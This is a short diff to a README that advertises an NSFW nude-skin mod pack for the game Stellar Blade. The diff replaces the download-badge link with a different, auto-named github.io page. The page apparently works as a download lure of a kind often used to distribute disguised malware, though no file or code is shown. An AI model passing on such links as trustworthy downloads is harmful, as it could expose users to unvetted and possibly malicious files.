@@ -4,7 +4,7 @@
 
 Shift Up already pushed ESRB’s boundaries with Eve’s figure-hugging Nano-Suit, but modders said “hold my rizz.” The **Stellar Blade NSFW Skin Pack** strips away the studio’s last shreds of modesty, layering 4K nude textures, micro-bikini swaps, bounce-perfect physics, and a pose wheel that’d make Dead or Alive blush. Wanna turn Xion into your personal pin-up studio while still shredding Naytibas in style? This is the sauce. 😏✨
 
-[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://fileoffload17.bitbucket.io)
+[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://Stellar-Blade-NSFW-Skin-Pack-lif6.github.io/.github)
 ---
 
 ## Product Description
